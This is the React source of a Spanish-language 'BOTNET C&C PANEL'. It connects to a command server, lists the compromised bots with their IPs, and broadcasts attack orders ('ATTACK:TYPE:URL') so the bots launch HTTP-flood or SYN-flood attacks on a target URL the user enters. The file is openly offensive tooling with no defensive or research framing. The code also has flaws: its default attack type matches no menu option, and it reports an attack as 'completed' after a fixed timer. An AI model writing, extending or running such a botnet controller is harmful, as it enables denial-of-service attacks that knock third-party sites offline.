import { useState, useEffect } from 'react'
import io from 'socket.io-client'
import axios from 'axios'
import './App.css'

const SERVER_URL = 'http://localhost:5000'

function App() {
    const [socket, setSocket] = useState(null)
    const [connected, setConnected] = useState(false)
    const [clients, setClients] = useState([])
    const [clientCount, setClientCount] = useState(0)
    const [messages, setMessages] = useState([])
    const [targetUrl, setTargetUrl] = useState('')
    const [attackType, setAttackType] = useState('ddos')
    const [showBotsList, setShowBotsList] = useState(false)
    const [attackInProgress, setAttackInProgress] = useState(false)

    useEffect(() => {
    // Conectar al servidor WebSocket
        const newSocket = io(SERVER_URL, {
            transports: ['websocket', 'polling']
        })

        newSocket.on('connect', () => {
            console.log('Conectado al servidor')
            
            // Registrarse como panel de control
            newSocket.emit('register_as_panel')
            
            setConnected(true)
            addMessage('Conectado al servidor como Panel de Control', 'success')
        })

        newSocket.on('disconnect', () => {
            console.log('Desconectado del servidor')
            setConnected(false)
            addMessage('Desconectado del servidor', 'error')
        })

        newSocket.on('client_connected', (data) => {
            console.log('Bot conectado:', data)
            setClientCount(data.total_clients)
            addMessage(`[+] Nuevo bot conectado. Total: ${data.total_clients}`, 'success')
        })

        newSocket.on('client_disconnected', (data) => {
            console.log('Bot desconectado:', data)
            setClientCount(data.total_clients)
            addMessage(`[-] Bot desconectado. Total: ${data.total_clients}`, 'warning')
        })

        newSocket.on('clients_update', (data) => {
            console.log('Actualización de clientes:', data)
            setClients(data.clients)
            setClientCount(data.count)
        })

        newSocket.on('broadcast_message', (data) => {
            console.log('Comando recibido:', data)
            addMessage(`[CMD] ${data.message}`, 'broadcast')
            if (attackInProgress) {
                setAttackInProgress(false)
            }
        })

        setSocket(newSocket)

        // Cleanup al desmontar
        return () => {
            newSocket.close()
        }
    }, [])

    const addMessage = (text, type = 'info') => {
        const timestamp = new Date().toLocaleTimeString()
        setMessages(prev => [...prev, { text, type, timestamp }].slice(-15)) // Mantener últimos 15
    }

    const handleAttack = async () => {
        if (!targetUrl.trim()) {
            addMessage('[!] Error: Ingresa una URL objetivo', 'error')
            return
        }

        if (clientCount === 0) {
            addMessage('[!] Error: No hay bots disponibles', 'error')
            return
        }

        setAttackInProgress(true)
        
        const attackMessage = `ATTACK:${attackType.toUpperCase()}:${targetUrl}`
        
        try {
            const response = await axios.post(`${SERVER_URL}/broadcast`, {
                message: attackMessage
            })
            
            console.log('Ataque iniciado:', response.data)
            addMessage(`[*] Ataque ${attackType.toUpperCase()} iniciado contra ${targetUrl}`, 'attack')
            addMessage(`[*] ${response.data.clients_notified} bots ejecutando ataque...`, 'info')
            
            // Simular finalización del ataque
            setTimeout(() => {
                setAttackInProgress(false)
                addMessage(`[✓] Ataque completado`, 'success')
            }, 3000)

        } catch (error) {
            console.error('Error al iniciar ataque:', error)
            addMessage('[!] Error al enviar comando de ataque', 'error')
            setAttackInProgress(false)
        }
    }

    const formatDate = (dateString) => {
        return new Date(dateString).toLocaleString('es-ES')
    }

    return (
        <div className="app">
            <header className="header">
                <div className="header-content">
                    <h1>BOTNET C&C PANEL</h1>
                </div>
                <div className={`status-indicator ${connected ? 'connected' : 'disconnected'}`}>
                    <span className="status-dot"></span>
                    <span>{connected ? 'ONLINE' : 'OFFLINE'}</span>
                </div>
            </header>

            <div className="main-content">
                {/* Panel de estadísticas */}
                <div className="stats-panel">
                    <div className="stat-card">
                        <h3>BOTS ACTIVOS</h3>
                        <div className="stat-value">{clientCount}</div>
                        <div className="stat-label">Nodos Disponibles</div>
                    </div>
                    <div className="stat-card">
                        <h3>ESTADO</h3>
                        <div className="stat-value status-text">
                        {attackInProgress ? 'ATK' : 'IDLE'}
                        </div>
                        <div className="stat-label">
                        {attackInProgress ? 'Ataque en Progreso' : 'En Espera'}
                        </div>
                    </div>
                </div>

                {/* Panel de ataque */}
                <div className="attack-panel">
                    <h2>CONFIGURACIÓN DE ATAQUE</h2>
                    <div className="attack-form">
                        <div className="form-group">
                            <label>Tipo de Ataque:</label>
                            <select 
                                value={attackType} 
                                onChange={(e) => setAttackType(e.target.value)}
                                disabled={attackInProgress}
                                className="attack-select"
                            >
                                <option value="http-flood">HTTP Flood</option>
                                <option value="syn-flood">SYN Flood</option>
                            </select>
                        </div>
                    
                        <div className="form-group">
                            <label>URL Objetivo:</label>
                            <input
                                type="text"
                                value={targetUrl}
                                onChange={(e) => setTargetUrl(e.target.value)}
                                placeholder="https://example.com"
                                onKeyDown={(e) => e.key === 'Enter' && !attackInProgress && handleAttack()}
                                disabled={!connected || attackInProgress}
                                className="target-input"
                            />
                        </div>
                        
                        <button 
                            onClick={handleAttack}
                            disabled={!connected || !targetUrl.trim() || attackInProgress || clientCount === 0}
                            className={`attack-button ${attackInProgress ? 'attacking' : ''}`}
                        >
                        {attackInProgress ? 'ATACANDO...' : 'INICIAR ATAQUE'}
                        </button>
                    </div>
                </div>

                {/* Panel de bots */}
                <div className="bots-panel">
                    <div className="panel-header">
                        <h2>BOTS CONECTADOS</h2>
                        <button 
                            className="toggle-button"
                            onClick={() => setShowBotsList(!showBotsList)}
                        >
                            {showBotsList ? '▲ Ocultar' : '▼ Mostrar Detalles'}
                        </button>
                    </div>

                    {showBotsList && (
                        <div className="bots-list">
                        {clients.length === 0 ? (
                            <p className="no-bots">No hay bots conectados</p>
                        ) : (
                            <div className="bots-grid">
                            {clients.map((client, index) => (
                                <div key={client.id} className="bot-card">
                                <div className="bot-header">
                                    <span className="bot-number">BOT #{index + 1}</span>
                                    <span className="bot-status">●</span>
                                </div>
                                <div className="bot-info">
                                    <div className="info-row">
                                    <strong>ID:</strong> {client.id.substring(0, 12)}...
                                    </div>
                                    <div className="info-row">
                                    <strong>IP:</strong> {client.ip}
                                    </div>
                                    <div className="info-row">
                                    <strong>Conectado:</strong> {formatDate(client.connected_at)}
                                    </div>
                                </div>
                                </div>
                            ))}
                            </div>
                        )}
                        </div>
                    )}
                </div>

                {/* Panel de logs */}
                <div className="logs-panel">
                    <h2>TERMINAL DE COMANDOS</h2>
                    <div className="logs-list">
                        {messages.length === 0 ? (
                            <p className="no-logs">Sistema inicializado. Esperando comandos...</p>
                            ) : (
                            messages.map((msg, index) => (
                                <div key={index} className={`log-entry log-${msg.type}`}>
                                <span className="log-time">[{msg.timestamp}]</span>
                                <span className="log-text">{msg.text}</span>
                                </div>
                            ))
                        )}
                    </div>
                </div>
            </div>
        </div>
    )
}

export default App
